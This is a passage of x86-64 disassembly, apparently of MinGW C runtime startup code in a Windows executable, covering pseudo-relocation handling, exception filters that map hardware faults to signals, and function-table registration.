  401efc:	83 c0 08             	add    $0x8,%eax
  401eff:	4c 8b 04 16          	mov    (%rsi,%rdx,1),%r8
  401f03:	4c 89 04 11          	mov    %r8,(%rcx,%rdx,1)
  401f07:	39 d8                	cmp    %ebx,%eax
  401f09:	72 ef                	jb     0x401efa
  401f0b:	48 83 c4 50          	add    $0x50,%rsp
  401f0f:	5b                   	pop    %rbx
  401f10:	5e                   	pop    %rsi
  401f11:	5f                   	pop    %rdi
  401f12:	5d                   	pop    %rbp
  401f13:	41 5c                	pop    %r12
  401f15:	c3                   	ret
  401f16:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  401f1d:	00 00 00 
  401f20:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
  401f25:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
  401f2a:	41 b8 40 00 00 00    	mov    $0x40,%r8d
  401f30:	48 03 3d e1 66 00 00 	add    0x66e1(%rip),%rdi        # 0x408618
  401f37:	48 89 4f 08          	mov    %rcx,0x8(%rdi)
  401f3b:	49 89 f9             	mov    %rdi,%r9
  401f3e:	48 89 57 10          	mov    %rdx,0x10(%rdi)
  401f42:	ff 15 cc 73 00 00    	call   *0x73cc(%rip)        # 0x409314
  401f48:	85 c0                	test   %eax,%eax
  401f4a:	0f 85 40 ff ff ff    	jne    0x401e90
  401f50:	ff 15 1e 73 00 00    	call   *0x731e(%rip)        # 0x409274
  401f56:	48 8d 0d fb 32 00 00 	lea    0x32fb(%rip),%rcx        # 0x405258
  401f5d:	89 c2                	mov    %eax,%edx
  401f5f:	e8 ec fd ff ff       	call   0x401d50
  401f64:	0f 1f 40 00          	nopl   0x0(%rax)
  401f68:	31 ff                	xor    %edi,%edi
  401f6a:	e9 a8 fe ff ff       	jmp    0x401e17
  401f6f:	90                   	nop
  401f70:	8b 06                	mov    (%rsi),%eax
  401f72:	89 db                	mov    %ebx,%ebx
  401f74:	41 89 04 24          	mov    %eax,(%r12)
  401f78:	8b 44 1e fc          	mov    -0x4(%rsi,%rbx,1),%eax
  401f7c:	41 89 44 1c fc       	mov    %eax,-0x4(%r12,%rbx,1)
  401f81:	e9 33 ff ff ff       	jmp    0x401eb9
  401f86:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  401f8d:	00 00 00 
  401f90:	89 db                	mov    %ebx,%ebx
  401f92:	0f b7 44 1e fe       	movzwl -0x2(%rsi,%rbx,1),%eax
  401f97:	66 41 89 44 1c fe    	mov    %ax,-0x2(%r12,%rbx,1)
  401f9d:	e9 17 ff ff ff       	jmp    0x401eb9
  401fa2:	4c 89 e2             	mov    %r12,%rdx
  401fa5:	48 8d 0d 54 32 00 00 	lea    0x3254(%rip),%rcx        # 0x405200
  401fac:	e8 9f fd ff ff       	call   0x401d50
  401fb1:	48 8b 05 60 66 00 00 	mov    0x6660(%rip),%rax        # 0x408618
  401fb8:	8b 55 08             	mov    0x8(%rbp),%edx
  401fbb:	48 8d 0d 5e 32 00 00 	lea    0x325e(%rip),%rcx        # 0x405220
  401fc2:	4c 8b 44 38 18       	mov    0x18(%rax,%rdi,1),%r8
  401fc7:	e8 84 fd ff ff       	call   0x401d50
  401fcc:	90                   	nop
  401fcd:	0f 1f 00             	nopl   (%rax)
  401fd0:	55                   	push   %rbp
  401fd1:	41 57                	push   %r15
  401fd3:	41 56                	push   %r14
  401fd5:	41 55                	push   %r13
  401fd7:	41 54                	push   %r12
  401fd9:	57                   	push   %rdi
  401fda:	56                   	push   %rsi
  401fdb:	53                   	push   %rbx
  401fdc:	48 83 ec 38          	sub    $0x38,%rsp
  401fe0:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
  401fe7:	00 
  401fe8:	8b 35 22 66 00 00    	mov    0x6622(%rip),%esi        # 0x408610
  401fee:	85 f6                	test   %esi,%esi
  401ff0:	74 16                	je     0x402008
  401ff2:	48 8d 65 b8          	lea    -0x48(%rbp),%rsp
  401ff6:	5b                   	pop    %rbx
  401ff7:	5e                   	pop    %rsi
  401ff8:	5f                   	pop    %rdi
  401ff9:	41 5c                	pop    %r12
  401ffb:	41 5d                	pop    %r13
  401ffd:	41 5e                	pop    %r14
  401fff:	41 5f                	pop    %r15
  402001:	5d                   	pop    %rbp
  402002:	c3                   	ret
  402003:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  402008:	c7 05 fe 65 00 00 01 	movl   $0x1,0x65fe(%rip)        # 0x408610
  40200f:	00 00 00 
  402012:	e8 99 0b 00 00       	call   0x402bb0
  402017:	48 98                	cltq
  402019:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
  40201d:	48 8d 04 c5 0f 00 00 	lea    0xf(,%rax,8),%rax
  402024:	00 
  402025:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
  402029:	e8 a2 0d 00 00       	call   0x402dd0
  40202e:	4c 8b 25 4b 33 00 00 	mov    0x334b(%rip),%r12        # 0x405380
  402035:	48 8b 1d 54 33 00 00 	mov    0x3354(%rip),%rbx        # 0x405390
  40203c:	c7 05 ce 65 00 00 00 	movl   $0x0,0x65ce(%rip)        # 0x408614
  402043:	00 00 00 
  402046:	48 29 c4             	sub    %rax,%rsp
  402049:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
  40204e:	48 89 05 c3 65 00 00 	mov    %rax,0x65c3(%rip)        # 0x408618
  402055:	4c 89 e0             	mov    %r12,%rax
  402058:	48 29 d8             	sub    %rbx,%rax
  40205b:	48 83 f8 07          	cmp    $0x7,%rax
  40205f:	7e 91                	jle    0x401ff2
  402061:	8b 13                	mov    (%rbx),%edx
  402063:	48 83 f8 0b          	cmp    $0xb,%rax
  402067:	0f 8f 4b 01 00 00    	jg     0x4021b8
  40206d:	85 d2                	test   %edx,%edx
  40206f:	0f 85 cb 01 00 00    	jne    0x402240
  402075:	8b 43 04             	mov    0x4(%rbx),%eax
  402078:	85 c0                	test   %eax,%eax
  40207a:	0f 85 c0 01 00 00    	jne    0x402240
  402080:	8b 53 08             	mov    0x8(%rbx),%edx
  402083:	83 fa 01             	cmp    $0x1,%edx
  402086:	0f 85 1c 02 00 00    	jne    0x4022a8
  40208c:	48 83 c3 0c          	add    $0xc,%rbx
  402090:	4c 8d 7d a8          	lea    -0x58(%rbp),%r15
  402094:	4c 8b 2d 15 33 00 00 	mov    0x3315(%rip),%r13        # 0x4053b0
  40209b:	49 be 00 00 00 00 ff 	movabs $0xffffffff00000000,%r14
  4020a2:	ff ff ff 
  4020a5:	4c 39 e3             	cmp    %r12,%rbx
  4020a8:	72 3f                	jb     0x4020e9
  4020aa:	e9 43 ff ff ff       	jmp    0x401ff2
  4020af:	90                   	nop
  4020b0:	44 0f b6 01          	movzbl (%rcx),%r8d
  4020b4:	4c 89 ff             	mov    %r15,%rdi
  4020b7:	4d 89 c2             	mov    %r8,%r10
  4020ba:	49 81 ca 00 ff ff ff 	or     $0xffffffffffffff00,%r10
  4020c1:	45 84 c0             	test   %r8b,%r8b
  4020c4:	4d 0f 48 c2          	cmovs  %r10,%r8
  4020c8:	49 29 d0             	sub    %rdx,%r8
  4020cb:	4c 89 fa             	mov    %r15,%rdx
  4020ce:	4d 01 c8             	add    %r9,%r8
  4020d1:	4c 89 45 a8          	mov    %r8,-0x58(%rbp)
  4020d5:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  4020db:	e8 e0 fc ff ff       	call   0x401dc0
  4020e0:	48 83 c3 0c          	add    $0xc,%rbx
  4020e4:	4c 39 e3             	cmp    %r12,%rbx
  4020e7:	73 77                	jae    0x402160
  4020e9:	8b 13                	mov    (%rbx),%edx
  4020eb:	8b 4b 04             	mov    0x4(%rbx),%ecx
  4020ee:	44 0f b6 43 08       	movzbl 0x8(%rbx),%r8d
  4020f3:	4c 01 ea             	add    %r13,%rdx
  4020f6:	4c 01 e9             	add    %r13,%rcx
  4020f9:	4c 8b 0a             	mov    (%rdx),%r9
  4020fc:	41 83 f8 20          	cmp    $0x20,%r8d
  402100:	0f 84 0a 01 00 00    	je     0x402210
  402106:	0f 87 d4 00 00 00    	ja     0x4021e0
  40210c:	41 83 f8 08          	cmp    $0x8,%r8d
  402110:	74 9e                	je     0x4020b0
  402112:	41 83 f8 10          	cmp    $0x10,%r8d
  402116:	0f 85 75 01 00 00    	jne    0x402291
  40211c:	44 0f b7 01          	movzwl (%rcx),%r8d
  402120:	4c 89 ff             	mov    %r15,%rdi
  402123:	4d 89 c2             	mov    %r8,%r10
  402126:	49 81 ca 00 00 ff ff 	or     $0xffffffffffff0000,%r10
  40212d:	66 45 85 c0          	test   %r8w,%r8w
  402131:	4d 0f 48 c2          	cmovs  %r10,%r8
  402135:	48 83 c3 0c          	add    $0xc,%rbx
  402139:	49 29 d0             	sub    %rdx,%r8
  40213c:	4c 89 fa             	mov    %r15,%rdx
  40213f:	4d 01 c8             	add    %r9,%r8
  402142:	4c 89 45 a8          	mov    %r8,-0x58(%rbp)
  402146:	41 b8 02 00 00 00    	mov    $0x2,%r8d
  40214c:	e8 6f fc ff ff       	call   0x401dc0
  402151:	4c 39 e3             	cmp    %r12,%rbx
  402154:	72 93                	jb     0x4020e9
  402156:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40215d:	00 00 00 
  402160:	8b 05 ae 64 00 00    	mov    0x64ae(%rip),%eax        # 0x408614
  402166:	85 c0                	test   %eax,%eax
  402168:	0f 8e 84 fe ff ff    	jle    0x401ff2
  40216e:	4c 8b 25 9f 71 00 00 	mov    0x719f(%rip),%r12        # 0x409314
  402175:	31 db                	xor    %ebx,%ebx
  402177:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40217e:	00 00 
  402180:	48 8b 05 91 64 00 00 	mov    0x6491(%rip),%rax        # 0x408618
  402187:	48 01 d8             	add    %rbx,%rax
  40218a:	44 8b 00             	mov    (%rax),%r8d
  40218d:	45 85 c0             	test   %r8d,%r8d
  402190:	74 0e                	je     0x4021a0
  402192:	48 8b 50 10          	mov    0x10(%rax),%rdx
  402196:	48 8b 48 08          	mov    0x8(%rax),%rcx
  40219a:	49 89 f9             	mov    %rdi,%r9
  40219d:	41 ff d4             	call   *%r12
  4021a0:	83 c6 01             	add    $0x1,%esi
  4021a3:	48 83 c3 28          	add    $0x28,%rbx
  4021a7:	3b 35 67 64 00 00    	cmp    0x6467(%rip),%esi        # 0x408614
  4021ad:	7c d1                	jl     0x402180
  4021af:	e9 3e fe ff ff       	jmp    0x401ff2
  4021b4:	0f 1f 40 00          	nopl   0x0(%rax)
  4021b8:	85 d2                	test   %edx,%edx
  4021ba:	0f 85 80 00 00 00    	jne    0x402240
  4021c0:	8b 43 04             	mov    0x4(%rbx),%eax
  4021c3:	89 c7                	mov    %eax,%edi
  4021c5:	0b 7b 08             	or     0x8(%rbx),%edi
  4021c8:	0f 85 aa fe ff ff    	jne    0x402078
  4021ce:	8b 53 0c             	mov    0xc(%rbx),%edx
  4021d1:	48 83 c3 0c          	add    $0xc,%rbx
  4021d5:	e9 93 fe ff ff       	jmp    0x40206d
  4021da:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  4021e0:	41 83 f8 40          	cmp    $0x40,%r8d
  4021e4:	0f 85 a7 00 00 00    	jne    0x402291
  4021ea:	48 8b 01             	mov    (%rcx),%rax
  4021ed:	41 b8 08 00 00 00    	mov    $0x8,%r8d
  4021f3:	4c 89 ff             	mov    %r15,%rdi
  4021f6:	48 29 d0             	sub    %rdx,%rax
  4021f9:	4c 89 fa             	mov    %r15,%rdx
  4021fc:	4c 01 c8             	add    %r9,%rax
  4021ff:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
  402203:	e8 b8 fb ff ff       	call   0x401dc0
  402208:	e9 d3 fe ff ff       	jmp    0x4020e0
  40220d:	0f 1f 00             	nopl   (%rax)
  402210:	8b 01                	mov    (%rcx),%eax
  402212:	4c 89 ff             	mov    %r15,%rdi
  402215:	49 89 c0             	mov    %rax,%r8
  402218:	4c 09 f0             	or     %r14,%rax
  40221b:	45 85 c0             	test   %r8d,%r8d
  40221e:	49 0f 49 c0          	cmovns %r8,%rax
  402222:	41 b8 04 00 00 00    	mov    $0x4,%r8d
  402228:	48 29 d0             	sub    %rdx,%rax
  40222b:	4c 89 fa             	mov    %r15,%rdx
  40222e:	4c 01 c8             	add    %r9,%rax
  402231:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
  402235:	e8 86 fb ff ff       	call   0x401dc0
  40223a:	e9 a1 fe ff ff       	jmp    0x4020e0
  40223f:	90                   	nop
  402240:	4c 39 e3             	cmp    %r12,%rbx
  402243:	0f 83 a9 fd ff ff    	jae    0x401ff2
  402249:	49 83 ec 01          	sub    $0x1,%r12
  40224d:	4c 8b 2d 5c 31 00 00 	mov    0x315c(%rip),%r13        # 0x4053b0
  402254:	48 8d 7d a8          	lea    -0x58(%rbp),%rdi
  402258:	49 29 dc             	sub    %rbx,%r12
  40225b:	49 c1 ec 03          	shr    $0x3,%r12
  40225f:	4e 8d 64 e3 08       	lea    0x8(%rbx,%r12,8),%r12
  402264:	0f 1f 40 00          	nopl   0x0(%rax)
  402268:	8b 4b 04             	mov    0x4(%rbx),%ecx
  40226b:	8b 03                	mov    (%rbx),%eax
  40226d:	41 b8 04 00 00 00    	mov    $0x4,%r8d
  402273:	48 89 fa             	mov    %rdi,%rdx
  402276:	48 83 c3 08          	add    $0x8,%rbx
  40227a:	4c 01 e9             	add    %r13,%rcx
  40227d:	03 01                	add    (%rcx),%eax
  40227f:	89 45 a8             	mov    %eax,-0x58(%rbp)
  402282:	e8 39 fb ff ff       	call   0x401dc0
  402287:	4c 39 e3             	cmp    %r12,%rbx
  40228a:	75 dc                	jne    0x402268
  40228c:	e9 cf fe ff ff       	jmp    0x402160
  402291:	44 89 c2             	mov    %r8d,%edx
  402294:	48 8d 0d 1d 30 00 00 	lea    0x301d(%rip),%rcx        # 0x4052b8
  40229b:	48 c7 45 a8 00 00 00 	movq   $0x0,-0x58(%rbp)
  4022a2:	00 
  4022a3:	e8 a8 fa ff ff       	call   0x401d50
  4022a8:	48 8d 0d d1 2f 00 00 	lea    0x2fd1(%rip),%rcx        # 0x405280
  4022af:	e8 9c fa ff ff       	call   0x401d50
  4022b4:	90                   	nop
  4022b5:	90                   	nop
  4022b6:	90                   	nop
  4022b7:	90                   	nop
  4022b8:	90                   	nop
  4022b9:	90                   	nop
  4022ba:	90                   	nop
  4022bb:	90                   	nop
  4022bc:	90                   	nop
  4022bd:	90                   	nop
  4022be:	90                   	nop
  4022bf:	90                   	nop
  4022c0:	48 83 ec 58          	sub    $0x58,%rsp
  4022c4:	48 8b 05 55 63 00 00 	mov    0x6355(%rip),%rax        # 0x408620
  4022cb:	48 85 c0             	test   %rax,%rax
  4022ce:	74 2c                	je     0x4022fc
  4022d0:	f2 0f 10 84 24 80 00 	movsd  0x80(%rsp),%xmm0
  4022d7:	00 00 
  4022d9:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
  4022dd:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
  4022e2:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
  4022e7:	f2 0f 11 54 24 30    	movsd  %xmm2,0x30(%rsp)
  4022ed:	f2 0f 11 5c 24 38    	movsd  %xmm3,0x38(%rsp)
  4022f3:	f2 0f 11 44 24 40    	movsd  %xmm0,0x40(%rsp)
  4022f9:	ff d0                	call   *%rax
  4022fb:	90                   	nop
  4022fc:	48 83 c4 58          	add    $0x58,%rsp
  402300:	c3                   	ret
  402301:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
  402308:	00 00 00 00 
  40230c:	0f 1f 40 00          	nopl   0x0(%rax)
  402310:	48 89 0d 09 63 00 00 	mov    %rcx,0x6309(%rip)        # 0x408620
  402317:	e9 7c 0b 00 00       	jmp    0x402e98
  40231c:	90                   	nop
  40231d:	90                   	nop
  40231e:	90                   	nop
  40231f:	90                   	nop
  402320:	48 83 ec 28          	sub    $0x28,%rsp
  402324:	8b 01                	mov    (%rcx),%eax
  402326:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
  40232b:	0f 87 2f 01 00 00    	ja     0x402460
  402331:	3d 8b 00 00 c0       	cmp    $0xc000008b,%eax
  402336:	76 58                	jbe    0x402390
  402338:	05 73 ff ff 3f       	add    $0x3fffff73,%eax
  40233d:	83 f8 09             	cmp    $0x9,%eax
  402340:	77 3a                	ja     0x40237c
  402342:	48 8d 15 a7 2f 00 00 	lea    0x2fa7(%rip),%rdx        # 0x4052f0
  402349:	48 63 04 82          	movslq (%rdx,%rax,4),%rax
  40234d:	48 01 d0             	add    %rdx,%rax
  402350:	ff e0                	jmp    *%rax
  402352:	31 d2                	xor    %edx,%edx
  402354:	b9 08 00 00 00       	mov    $0x8,%ecx
  402359:	e8 d2 0a 00 00       	call   0x402e30
  40235e:	48 83 f8 01          	cmp    $0x1,%rax
  402362:	0f 85 a5 00 00 00    	jne    0x40240d
  402368:	ba 01 00 00 00       	mov    $0x1,%edx
  40236d:	b9 08 00 00 00       	mov    $0x8,%ecx
  402372:	e8 b9 0a 00 00       	call   0x402e30
  402377:	e8 c4 f9 ff ff       	call   0x401d40
  40237c:	45 31 c0             	xor    %r8d,%r8d
  40237f:	44 89 c0             	mov    %r8d,%eax
  402382:	48 83 c4 28          	add    $0x28,%rsp
  402386:	c3                   	ret
  402387:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40238e:	00 00 
  402390:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
  402395:	0f 84 95 00 00 00    	je     0x402430
  40239b:	76 46                	jbe    0x4023e3
  40239d:	45 31 c0             	xor    %r8d,%r8d
  4023a0:	3d 08 00 00 c0       	cmp    $0xc0000008,%eax
  4023a5:	74 d8                	je     0x40237f
  4023a7:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
  4023ac:	0f 85 ae 00 00 00    	jne    0x402460
  4023b2:	31 d2                	xor    %edx,%edx
  4023b4:	b9 04 00 00 00       	mov    $0x4,%ecx
  4023b9:	e8 72 0a 00 00       	call   0x402e30
  4023be:	48 83 f8 01          	cmp    $0x1,%rax
  4023c2:	0f 84 b8 00 00 00    	je     0x402480
  4023c8:	48 85 c0             	test   %rax,%rax
  4023cb:	0f 84 9f 00 00 00    	je     0x402470
  4023d1:	b9 04 00 00 00       	mov    $0x4,%ecx
  4023d6:	ff d0                	call   *%rax
  4023d8:	45 31 c0             	xor    %r8d,%r8d
  4023db:	44 89 c0             	mov    %r8d,%eax
  4023de:	48 83 c4 28          	add    $0x28,%rsp
  4023e2:	c3                   	ret
  4023e3:	45 31 c0             	xor    %r8d,%r8d
  4023e6:	3d 02 00 00 80       	cmp    $0x80000002,%eax
  4023eb:	41 0f 95 c0          	setne  %r8b
  4023ef:	44 89 c0             	mov    %r8d,%eax
  4023f2:	48 83 c4 28          	add    $0x28,%rsp
  4023f6:	c3                   	ret
  4023f7:	31 d2                	xor    %edx,%edx
  4023f9:	b9 08 00 00 00       	mov    $0x8,%ecx
  4023fe:	e8 2d 0a 00 00       	call   0x402e30
  402403:	48 83 f8 01          	cmp    $0x1,%rax
  402407:	0f 84 93 00 00 00    	je     0x4024a0
  40240d:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  402413:	48 85 c0             	test   %rax,%rax
  402416:	0f 84 63 ff ff ff    	je     0x40237f
  40241c:	b9 08 00 00 00       	mov    $0x8,%ecx
  402421:	ff d0                	call   *%rax
  402423:	45 31 c0             	xor    %r8d,%r8d
  402426:	e9 54 ff ff ff       	jmp    0x40237f
  40242b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  402430:	31 d2                	xor    %edx,%edx
  402432:	b9 0b 00 00 00       	mov    $0xb,%ecx
  402437:	e8 f4 09 00 00       	call   0x402e30
  40243c:	48 83 f8 01          	cmp    $0x1,%rax
  402440:	74 7e                	je     0x4024c0
  402442:	48 85 c0             	test   %rax,%rax
  402445:	74 29                	je     0x402470
  402447:	b9 0b 00 00 00       	mov    $0xb,%ecx
  40244c:	ff d0                	call   *%rax
  40244e:	45 31 c0             	xor    %r8d,%r8d
  402451:	e9 29 ff ff ff       	jmp    0x40237f
  402456:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40245d:	00 00 00 
  402460:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  402466:	e9 14 ff ff ff       	jmp    0x40237f
  40246b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  402470:	41 b8 04 00 00 00    	mov    $0x4,%r8d
  402476:	e9 04 ff ff ff       	jmp    0x40237f
  40247b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  402480:	ba 01 00 00 00       	mov    $0x1,%edx
  402485:	b9 04 00 00 00       	mov    $0x4,%ecx
  40248a:	e8 a1 09 00 00       	call   0x402e30
  40248f:	45 31 c0             	xor    %r8d,%r8d
  402492:	e9 e8 fe ff ff       	jmp    0x40237f
  402497:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40249e:	00 00 
  4024a0:	ba 01 00 00 00       	mov    $0x1,%edx
  4024a5:	b9 08 00 00 00       	mov    $0x8,%ecx
  4024aa:	e8 81 09 00 00       	call   0x402e30
  4024af:	45 31 c0             	xor    %r8d,%r8d
  4024b2:	e9 c8 fe ff ff       	jmp    0x40237f
  4024b7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  4024be:	00 00 
  4024c0:	ba 01 00 00 00       	mov    $0x1,%edx
  4024c5:	b9 0b 00 00 00       	mov    $0xb,%ecx
  4024ca:	e8 61 09 00 00       	call   0x402e30
  4024cf:	45 31 c0             	xor    %r8d,%r8d
  4024d2:	e9 a8 fe ff ff       	jmp    0x40237f
  4024d7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  4024de:	00 00 
  4024e0:	41 54                	push   %r12
  4024e2:	55                   	push   %rbp
  4024e3:	57                   	push   %rdi
  4024e4:	56                   	push   %rsi
  4024e5:	53                   	push   %rbx
  4024e6:	48 83 ec 20          	sub    $0x20,%rsp
  4024ea:	e8 61 07 00 00       	call   0x402c50
  4024ef:	48 89 c6             	mov    %rax,%rsi
  4024f2:	8b 05 50 61 00 00    	mov    0x6150(%rip),%eax        # 0x408648
  4024f8:	85 c0                	test   %eax,%eax
  4024fa:	75 25                	jne    0x402521
  4024fc:	48 85 f6             	test   %rsi,%rsi
  4024ff:	74 20                	je     0x402521
  402501:	48 8d 0d 10 2e 00 00 	lea    0x2e10(%rip),%rcx        # 0x405318
  402508:	c7 05 36 61 00 00 01 	movl   $0x1,0x6136(%rip)        # 0x408648
  40250f:	00 00 00 
  402512:	e8 69 05 00 00       	call   0x402a80
  402517:	48 85 c0             	test   %rax,%rax
  40251a:	74 14                	je     0x402530
  40251c:	b8 01 00 00 00       	mov    $0x1,%eax
  402521:	48 83 c4 20          	add    $0x20,%rsp
  402525:	5b                   	pop    %rbx
  402526:	5e                   	pop    %rsi
  402527:	5f                   	pop    %rdi
  402528:	5d                   	pop    %rbp
  402529:	41 5c                	pop    %r12
  40252b:	c3                   	ret
  40252c:	0f 1f 40 00          	nopl   0x0(%rax)
  402530:	48 8d 1d 29 62 00 00 	lea    0x6229(%rip),%rbx        # 0x408760
  402537:	b9 30 00 00 00       	mov    $0x30,%ecx
  40253c:	45 31 e4             	xor    %r12d,%r12d
  40253f:	48 8d 15 1a 61 00 00 	lea    0x611a(%rip),%rdx        # 0x408660
  402546:	48 89 df             	mov    %rbx,%rdi
  402549:	48 8d 2d d0 fd ff ff 	lea    -0x230(%rip),%rbp        # 0x402320
  402550:	f3 48 ab             	rep stos %rax,(%rdi)
  402553:	b9 20 00 00 00       	mov    $0x20,%ecx
  402558:	48 89 d7             	mov    %rdx,%rdi
  40255b:	48 29 f5             	sub    %rsi,%rbp
  40255e:	f3 48 ab             	rep stos %rax,(%rdi)
  402561:	48 89 d7             	mov    %rdx,%rdi
  402564:	eb 37                	jmp    0x40259d
  402566:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40256d:	00 00 00 
  402570:	c6 07 09             	movb   $0x9,(%rdi)
  402573:	49 83 c4 01          	add    $0x1,%r12
  402577:	48 83 c3 0c          	add    $0xc,%rbx
  40257b:	89 6f 04             	mov    %ebp,0x4(%rdi)
  40257e:	8b 50 0c             	mov    0xc(%rax),%edx
  402581:	89 53 f4             	mov    %edx,-0xc(%rbx)
  402584:	03 50 08             	add    0x8(%rax),%edx
  402587:	48 89 f8             	mov    %rdi,%rax
  40258a:	48 83 c7 08          	add    $0x8,%rdi
  40258e:	48 29 f0             	sub    %rsi,%rax
  402591:	89 53 f8             	mov    %edx,-0x8(%rbx)
  402594:	89 43 fc             	mov    %eax,-0x4(%rbx)
  402597:	49 83 fc 20          	cmp    $0x20,%r12
  40259b:	74 23                	je     0x4025c0
  40259d:	4c 89 e1             	mov    %r12,%rcx
  4025a0:	e8 3b 06 00 00       	call   0x402be0
  4025a5:	48 85 c0             	test   %rax,%rax
  4025a8:	75 c6                	jne    0x402570
  4025aa:	4d 85 e4             	test   %r12,%r12
  4025ad:	0f 84 69 ff ff ff    	je     0x40251c
  4025b3:	44 89 e2             	mov    %r12d,%edx
  4025b6:	eb 0d                	jmp    0x4025c5
  4025b8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  4025bf:	00 
  4025c0:	ba 20 00 00 00       	mov    $0x20,%edx
  4025c5:	49 89 f0             	mov    %rsi,%r8
  4025c8:	48 8d 0d 91 61 00 00 	lea    0x6191(%rip),%rcx        # 0x408760
  4025cf:	ff 15 ef 6c 00 00    	call   *0x6cef(%rip)        # 0x4092c4
  4025d5:	e9 42 ff ff ff       	jmp    0x40251c
  4025da:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  4025e0:	41 54                	push   %r12
  4025e2:	48 83 ec 20          	sub    $0x20,%rsp
  4025e6:	48 8b 11             	mov    (%rcx),%rdx
  4025e9:	8b 02                	mov    (%rdx),%eax
  4025eb:	49 89 cc             	mov    %rcx,%r12
  4025ee:	89 c1                	mov    %eax,%ecx
  4025f0:	81 e1 ff ff ff 20    	and    $0x20ffffff,%ecx
  4025f6:	81 f9 43 43 47 20    	cmp    $0x20474343,%ecx
  4025fc:	0f 84 ce 00 00 00    	je     0x4026d0
  402602:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
  402607:	0f 87 aa 00 00 00    	ja     0x4026b7
  40260d:	3d 8b 00 00 c0       	cmp    $0xc000008b,%eax
  402612:	76 54                	jbe    0x402668
  402614:	05 73 ff ff 3f       	add    $0x3fffff73,%eax
  402619:	83 f8 09             	cmp    $0x9,%eax
  40261c:	77 3a                	ja     0x402658
  40261e:	48 8d 15 fb 2c 00 00 	lea    0x2cfb(%rip),%rdx        # 0x405320
  402625:	48 63 04 82          	movslq (%rdx,%rax,4),%rax
  402629:	48 01 d0             	add    %rdx,%rax
  40262c:	ff e0                	jmp    *%rax
  40262e:	31 d2                	xor    %edx,%edx
  402630:	b9 08 00 00 00       	mov    $0x8,%ecx
  402635:	e8 f6 07 00 00       	call   0x402e30
  40263a:	48 83 f8 01          	cmp    $0x1,%rax
  40263e:	0f 85 b7 00 00 00    	jne    0x4026fb
  402644:	ba 01 00 00 00       	mov    $0x1,%edx
  402649:	b9 08 00 00 00       	mov    $0x8,%ecx
  40264e:	e8 dd 07 00 00       	call   0x402e30
  402653:	e8 e8 f6 ff ff       	call   0x401d40
  402658:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40265d:	48 83 c4 20          	add    $0x20,%rsp
  402661:	41 5c                	pop    %r12
  402663:	c3                   	ret
  402664:	0f 1f 40 00          	nopl   0x0(%rax)
  402668:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
  40266d:	0f 84 a5 00 00 00    	je     0x402718
  402673:	76 3b                	jbe    0x4026b0
  402675:	3d 08 00 00 c0       	cmp    $0xc0000008,%eax
  40267a:	74 dc                	je     0x402658
  40267c:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
  402681:	75 34                	jne    0x4026b7
  402683:	31 d2                	xor    %edx,%edx
  402685:	b9 04 00 00 00       	mov    $0x4,%ecx
  40268a:	e8 a1 07 00 00       	call   0x402e30
  40268f:	48 83 f8 01          	cmp    $0x1,%rax
  402693:	0f 84 a7 00 00 00    	je     0x402740
  402699:	48 85 c0             	test   %rax,%rax
  40269c:	74 19                	je     0x4026b7
  40269e:	b9 04 00 00 00       	mov    $0x4,%ecx
  4026a3:	ff d0                	call   *%rax
  4026a5:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4026aa:	eb b1                	jmp    0x40265d
  4026ac:	0f 1f 40 00          	nopl   0x0(%rax)
  4026b0:	3d 02 00 00 80       	cmp    $0x80000002,%eax
  4026b5:	74 a1                	je     0x402658
  4026b7:	48 8b 05 82 5f 00 00 	mov    0x5f82(%rip),%rax        # 0x408640
  4026be:	48 85 c0             	test   %rax,%rax
  4026c1:	74 1d                	je     0x4026e0
  4026c3:	4c 89 e1             	mov    %r12,%rcx
  4026c6:	48 83 c4 20          	add    $0x20,%rsp
  4026ca:	41 5c                	pop    %r12
  4026cc:	48 ff e0             	rex.W jmp *%rax
  4026cf:	90                   	nop
  4026d0:	f6 42 04 01          	testb  $0x1,0x4(%rdx)
  4026d4:	0f 85 28 ff ff ff    	jne    0x402602
  4026da:	e9 79 ff ff ff       	jmp    0x402658
  4026df:	90                   	nop
  4026e0:	31 c0                	xor    %eax,%eax
  4026e2:	48 83 c4 20          	add    $0x20,%rsp
